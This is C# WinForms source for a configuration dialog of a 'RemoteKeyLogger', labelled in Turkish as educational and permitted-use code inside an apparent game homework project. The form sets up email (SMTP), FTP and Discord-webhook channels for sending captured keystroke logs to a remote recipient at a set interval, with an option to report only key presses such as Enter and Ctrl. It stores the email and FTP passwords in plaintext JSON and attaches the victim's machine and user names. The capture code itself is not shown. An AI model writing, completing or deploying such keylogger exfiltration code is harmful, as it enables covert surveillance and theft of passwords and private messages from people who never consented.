using System;
using System.Drawing;
using System.IO;
using System.Text.Json;
using System.Windows.Forms;
using DevExpress.XtraEditors;

namespace GameOdev
{
    /// <summary>
    /// Uzaktan takip konfigürasyon formu
    /// Eğitim amaçlı - izinli kullanım için
    /// </summary>
    public partial class ConfigForm : DevExpress.XtraEditors.XtraForm
    {
        private RemoteKeyLogger remoteKeyLogger;
        private RemoteConfig config;

        public ConfigForm(RemoteKeyLogger keyLogger)
        {
            InitializeComponent();
            this.remoteKeyLogger = keyLogger;
            this.config = new RemoteConfig();
            SetupConfigUI();
            LoadCurrentConfig();
        }

        private void SetupConfigUI()
        {
            // Form özellikleri
            this.Text = "⚙️ Uzaktan Takip Konfigürasyonu";
            this.Size = new Size(600, 700);
            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;

            // Ana panel
            Panel mainPanel = new Panel();
            mainPanel.Size = new Size(580, 650);
            mainPanel.Location = new Point(10, 10);
            mainPanel.AutoScroll = true;
            this.Controls.Add(mainPanel);

            int yPos = 20;

            // E-posta konfigürasyonu
            GroupBox emailGroup = new GroupBox();
            emailGroup.Text = "📧 E-posta Konfigürasyonu";
            emailGroup.Size = new Size(550, 180);
            emailGroup.Location = new Point(10, yPos);
            mainPanel.Controls.Add(emailGroup);

            // E-posta aktif checkbox
            CheckBox emailEnabled = new CheckBox();
            emailEnabled.Name = "emailEnabled";
            emailEnabled.Text = "E-posta gönderimini etkinleştir";
            emailEnabled.Size = new Size(200, 20);
            emailEnabled.Location = new Point(20, 25);
            emailGroup.Controls.Add(emailEnabled);

            // SMTP Server
            Label smtpLabel = new Label();
            smtpLabel.Text = "SMTP Sunucu:";
            smtpLabel.Size = new Size(80, 20);
            smtpLabel.Location = new Point(20, 55);
            emailGroup.Controls.Add(smtpLabel);

            TextEdit smtpServer = new TextEdit();
            smtpServer.Name = "smtpServer";
            smtpServer.Size = new Size(200, 20);
            smtpServer.Location = new Point(110, 52);
            emailGroup.Controls.Add(smtpServer);

            // SMTP Port
            Label portLabel = new Label();
            portLabel.Text = "Port:";
            portLabel.Size = new Size(30, 20);
            portLabel.Location = new Point(320, 55);
            emailGroup.Controls.Add(portLabel);

            SpinEdit smtpPort = new SpinEdit();
            smtpPort.Name = "smtpPort";
            smtpPort.Size = new Size(60, 20);
            smtpPort.Location = new Point(360, 52);
            smtpPort.Properties.MinValue = 1;
            smtpPort.Properties.MaxValue = 65535;
            emailGroup.Controls.Add(smtpPort);

            // Gönderen E-posta
            Label senderLabel = new Label();
            senderLabel.Text = "Gönderen E-posta:";
            senderLabel.Size = new Size(100, 20);
            senderLabel.Location = new Point(20, 85);
            emailGroup.Controls.Add(senderLabel);

            TextEdit senderEmail = new TextEdit();
            senderEmail.Name = "senderEmail";
            senderEmail.Size = new Size(300, 20);
            senderEmail.Location = new Point(130, 82);
            emailGroup.Controls.Add(senderEmail);

            // Şifre
            Label passwordLabel = new Label();
            passwordLabel.Text = "Şifre/App Password:";
            passwordLabel.Size = new Size(120, 20);
            passwordLabel.Location = new Point(20, 115);
            emailGroup.Controls.Add(passwordLabel);

            TextEdit password = new TextEdit();
            password.Name = "password";
            password.Size = new Size(200, 20);
            password.Location = new Point(150, 112);
            password.Properties.PasswordChar = '*';
            emailGroup.Controls.Add(password);

            // Alıcı E-posta
            Label recipientLabel = new Label();
            recipientLabel.Text = "Alıcı E-posta:";
            recipientLabel.Size = new Size(80, 20);
            recipientLabel.Location = new Point(20, 145);
            emailGroup.Controls.Add(recipientLabel);

            TextEdit recipientEmail = new TextEdit();
            recipientEmail.Name = "recipientEmail";
            recipientEmail.Size = new Size(300, 20);
            recipientEmail.Location = new Point(110, 142);
            emailGroup.Controls.Add(recipientEmail);

            yPos += 200;

            // FTP konfigürasyonu
            GroupBox ftpGroup = new GroupBox();
            ftpGroup.Text = "🌐 FTP Konfigürasyonu";
            ftpGroup.Size = new Size(550, 150);
            ftpGroup.Location = new Point(10, yPos);
            mainPanel.Controls.Add(ftpGroup);

            // FTP aktif checkbox
            CheckBox ftpEnabled = new CheckBox();
            ftpEnabled.Name = "ftpEnabled";
            ftpEnabled.Text = "FTP yüklemeyi etkinleştir";
            ftpEnabled.Size = new Size(150, 20);
            ftpEnabled.Location = new Point(20, 25);
            ftpGroup.Controls.Add(ftpEnabled);

            // FTP Server
            Label ftpServerLabel = new Label();
            ftpServerLabel.Text = "FTP Sunucu:";
            ftpServerLabel.Size = new Size(80, 20);
            ftpServerLabel.Location = new Point(20, 55);
            ftpGroup.Controls.Add(ftpServerLabel);

            TextEdit ftpServer = new TextEdit();
            ftpServer.Name = "ftpServer";
            ftpServer.Size = new Size(200, 20);
            ftpServer.Location = new Point(110, 52);
            ftpGroup.Controls.Add(ftpServer);

            // FTP Kullanıcı
            Label ftpUserLabel = new Label();
            ftpUserLabel.Text = "Kullanıcı:";
            ftpUserLabel.Size = new Size(60, 20);
            ftpUserLabel.Location = new Point(20, 85);
            ftpGroup.Controls.Add(ftpUserLabel);

            TextEdit ftpUser = new TextEdit();
            ftpUser.Name = "ftpUser";
            ftpUser.Size = new Size(150, 20);
            ftpUser.Location = new Point(90, 82);
            ftpGroup.Controls.Add(ftpUser);

            // FTP Şifre
            Label ftpPassLabel = new Label();
            ftpPassLabel.Text = "Şifre:";
            ftpPassLabel.Size = new Size(40, 20);
            ftpPassLabel.Location = new Point(250, 85);
            ftpGroup.Controls.Add(ftpPassLabel);

            TextEdit ftpPass = new TextEdit();
            ftpPass.Name = "ftpPass";
            ftpPass.Size = new Size(150, 20);
            ftpPass.Location = new Point(300, 82);
            ftpPass.Properties.PasswordChar = '*';
            ftpGroup.Controls.Add(ftpPass);

            // FTP Dizin
            Label ftpDirLabel = new Label();
            ftpDirLabel.Text = "Uzak Dizin:";
            ftpDirLabel.Size = new Size(70, 20);
            ftpDirLabel.Location = new Point(20, 115);
            ftpGroup.Controls.Add(ftpDirLabel);

            TextEdit ftpDir = new TextEdit();
            ftpDir.Name = "ftpDir";
            ftpDir.Size = new Size(300, 20);
            ftpDir.Location = new Point(100, 112);
            ftpDir.Text = "/logs/";
            ftpGroup.Controls.Add(ftpDir);

            yPos += 170;

            // Webhook konfigürasyonu
            GroupBox webhookGroup = new GroupBox();
            webhookGroup.Text = "📱 Webhook Konfigürasyonu";
            webhookGroup.Size = new Size(550, 120);
            webhookGroup.Location = new Point(10, yPos);
            mainPanel.Controls.Add(webhookGroup);

            // Webhook aktif checkbox
            CheckBox webhookEnabled = new CheckBox();
            webhookEnabled.Name = "webhookEnabled";
            webhookEnabled.Text = "Webhook bildirimlerini etkinleştir";
            webhookEnabled.Size = new Size(200, 20);
            webhookEnabled.Location = new Point(20, 25);
            webhookGroup.Controls.Add(webhookEnabled);

            // Webhook URL
            Label webhookUrlLabel = new Label();
            webhookUrlLabel.Text = "Webhook URL:";
            webhookUrlLabel.Size = new Size(80, 20);
            webhookUrlLabel.Location = new Point(20, 55);
            webhookGroup.Controls.Add(webhookUrlLabel);

            TextEdit webhookUrl = new TextEdit();
            webhookUrl.Name = "webhookUrl";
            webhookUrl.Size = new Size(400, 20);
            webhookUrl.Location = new Point(110, 52);
            webhookUrl.Properties.NullText = "https://discord.com/api/webhooks/...";
            webhookGroup.Controls.Add(webhookUrl);

            // Sadece önemli tuşlar
            CheckBox importantKeysOnly = new CheckBox();
            importantKeysOnly.Name = "importantKeysOnly";
            importantKeysOnly.Text = "Sadece önemli tuşlar için bildirim gönder (Enter, Ctrl, vb.)";
            importantKeysOnly.Size = new Size(350, 20);
            importantKeysOnly.Location = new Point(20, 85);
            importantKeysOnly.Checked = true;
            webhookGroup.Controls.Add(importantKeysOnly);

            yPos += 140;

            // Genel ayarlar
            GroupBox generalGroup = new GroupBox();
            generalGroup.Text = "⚙️ Genel Ayarlar";
            generalGroup.Size = new Size(550, 100);
            generalGroup.Location = new Point(10, yPos);
            mainPanel.Controls.Add(generalGroup);

            // Maksimum queue boyutu
            Label maxQueueLabel = new Label();
            maxQueueLabel.Text = "Maksimum Queue Boyutu:";
            maxQueueLabel.Size = new Size(150, 20);
            maxQueueLabel.Location = new Point(20, 30);
            generalGroup.Controls.Add(maxQueueLabel);

            SpinEdit maxQueue = new SpinEdit();
            maxQueue.Name = "maxQueue";
            maxQueue.Size = new Size(80, 20);
            maxQueue.Location = new Point(180, 27);
            maxQueue.Properties.MinValue = 100;
            maxQueue.Properties.MaxValue = 10000;
            maxQueue.Properties.Increment = 100;
            generalGroup.Controls.Add(maxQueue);

            // Gönderim aralığı (dakika)
            Label intervalLabel = new Label();
            intervalLabel.Text = "Gönderim Aralığı (dakika):";
            intervalLabel.Size = new Size(150, 20);
            intervalLabel.Location = new Point(20, 60);
            generalGroup.Controls.Add(intervalLabel);

            SpinEdit interval = new SpinEdit();
            interval.Name = "interval";
            interval.Size = new Size(60, 20);
            interval.Location = new Point(180, 57);
            interval.Properties.MinValue = 1;
            interval.Properties.MaxValue = 1440;
            interval.Properties.Increment = 5;
            generalGroup.Controls.Add(interval);

            yPos += 120;

            // Butonlar
            Panel buttonPanel = new Panel();
            buttonPanel.Size = new Size(550, 50);
            buttonPanel.Location = new Point(10, yPos);
            mainPanel.Controls.Add(buttonPanel);

            // Test butonu
            SimpleButton testButton = new SimpleButton();
            testButton.Text = "🧪 Test Bağlantıları";
            testButton.Size = new Size(120, 35);
            testButton.Location = new Point(20, 10);
            testButton.Click += TestButton_Click;
            buttonPanel.Controls.Add(testButton);

            // Kaydet butonu
            SimpleButton saveButton = new SimpleButton();
            saveButton.Text = "💾 Kaydet";
            saveButton.Size = new Size(80, 35);
            saveButton.Location = new Point(350, 10);
            saveButton.Click += SaveButton_Click;
            buttonPanel.Controls.Add(saveButton);

            // İptal butonu
            SimpleButton cancelButton = new SimpleButton();
            cancelButton.Text = "❌ İptal";
            cancelButton.Size = new Size(80, 35);
            cancelButton.Location = new Point(440, 10);
            cancelButton.Click += CancelButton_Click;
            buttonPanel.Controls.Add(cancelButton);
        }

        private void LoadCurrentConfig()
        {
            try
            {
                // Mevcut konfigürasyonu yükle
                if (File.Exists("remote_config.json"))
                {
                    string jsonConfig = File.ReadAllText("remote_config.json");
                    config = JsonSerializer.Deserialize<RemoteConfig>(jsonConfig);
                }

                // Form kontrollerini doldur
                SetControlValue("emailEnabled", config.EmailSettings.Enabled);
                SetControlValue("smtpServer", config.EmailSettings.SmtpServer);
                SetControlValue("smtpPort", config.EmailSettings.SmtpPort);
                SetControlValue("senderEmail", config.EmailSettings.SenderEmail);
                SetControlValue("password", config.EmailSettings.SenderPassword);
                SetControlValue("recipientEmail", config.EmailSettings.RecipientEmail);

                SetControlValue("ftpEnabled", config.FtpSettings.Enabled);
                SetControlValue("ftpServer", config.FtpSettings.Server);
                SetControlValue("ftpUser", config.FtpSettings.Username);
                SetControlValue("ftpPass", config.FtpSettings.Password);
                SetControlValue("ftpDir", config.FtpSettings.RemoteDirectory);

                SetControlValue("webhookEnabled", config.WebhookSettings.Enabled);
                SetControlValue("webhookUrl", config.WebhookSettings.WebhookUrl);
                SetControlValue("importantKeysOnly", config.WebhookSettings.SendImportantKeysOnly);

                SetControlValue("maxQueue", config.GeneralSettings.MaxQueueSize);
                SetControlValue("interval", config.EmailSettings.SendIntervalMinutes);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Konfigürasyon yükleme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SetControlValue(string controlName, object value)
        {
            try
            {
                Control control = this.Controls.Find(controlName, true)[0];
                
                if (control is CheckBox checkbox)
                {
                    checkbox.Checked = (bool)value;
                }
                else if (control is TextEdit textEdit)
                {
                    textEdit.Text = value?.ToString() ?? "";
                }
                else if (control is SpinEdit spinEdit)
                {
                    spinEdit.Value = Convert.ToInt32(value);
                }
            }
            catch
            {
                // Kontrol bulunamadı, sessizce devam et
            }
        }

        private object GetControlValue(string controlName)
        {
            try
            {
                Control control = this.Controls.Find(controlName, true)[0];
                
                if (control is CheckBox checkbox)
                {
                    return checkbox.Checked;
                }
                else if (control is TextEdit textEdit)
                {
                    return textEdit.Text;
                }
                else if (control is SpinEdit spinEdit)
                {
                    return (int)spinEdit.Value;
                }
            }
            catch
            {
                // Kontrol bulunamadı
            }
            
            return null;
        }

        private void TestButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show("🧪 Test özelliği yakında eklenecek!\n\n" +
                           "Şu anda manuel test yapabilirsiniz:\n" +
                           "📧 E-posta: Gmail SMTP ayarlarını kontrol edin\n" +
                           "🌐 FTP: Sunucu bağlantısını test edin\n" +
                           "📱 Webhook: Discord webhook URL'sini test edin", 
                           "Test Bilgisi", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void SaveButton_Click(object sender, EventArgs e)
        {
            try
            {
                // Form değerlerini config'e aktar
                config.EmailSettings.Enabled = (bool)GetControlValue("emailEnabled");
                config.EmailSettings.SmtpServer = GetControlValue("smtpServer")?.ToString() ?? "";
                config.EmailSettings.SmtpPort = (int)GetControlValue("smtpPort");
                config.EmailSettings.SenderEmail = GetControlValue("senderEmail")?.ToString() ?? "";
                config.EmailSettings.SenderPassword = GetControlValue("password")?.ToString() ?? "";
                config.EmailSettings.RecipientEmail = GetControlValue("recipientEmail")?.ToString() ?? "";
                config.EmailSettings.SendIntervalMinutes = (int)GetControlValue("interval");

                config.FtpSettings.Enabled = (bool)GetControlValue("ftpEnabled");
                config.FtpSettings.Server = GetControlValue("ftpServer")?.ToString() ?? "";
                config.FtpSettings.Username = GetControlValue("ftpUser")?.ToString() ?? "";
                config.FtpSettings.Password = GetControlValue("ftpPass")?.ToString() ?? "";
                config.FtpSettings.RemoteDirectory = GetControlValue("ftpDir")?.ToString() ?? "/logs/";
                config.FtpSettings.UploadIntervalMinutes = (int)GetControlValue("interval");

                config.WebhookSettings.Enabled = (bool)GetControlValue("webhookEnabled");
                config.WebhookSettings.WebhookUrl = GetControlValue("webhookUrl")?.ToString() ?? "";
                config.WebhookSettings.SendImportantKeysOnly = (bool)GetControlValue("importantKeysOnly");

                config.GeneralSettings.MaxQueueSize = (int)GetControlValue("maxQueue");
                config.GeneralSettings.ComputerName = Environment.MachineName;
                config.GeneralSettings.UserName = Environment.UserName;

                // Konfigürasyonu kaydet
                string jsonConfig = JsonSerializer.Serialize(config, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText("remote_config.json", jsonConfig);

                // RemoteKeyLogger'ı güncelle
                remoteKeyLogger.UpdateConfiguration(config);

                this.DialogResult = DialogResult.OK;
                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Konfigürasyon kaydetme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CancelButton_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }
    }
}
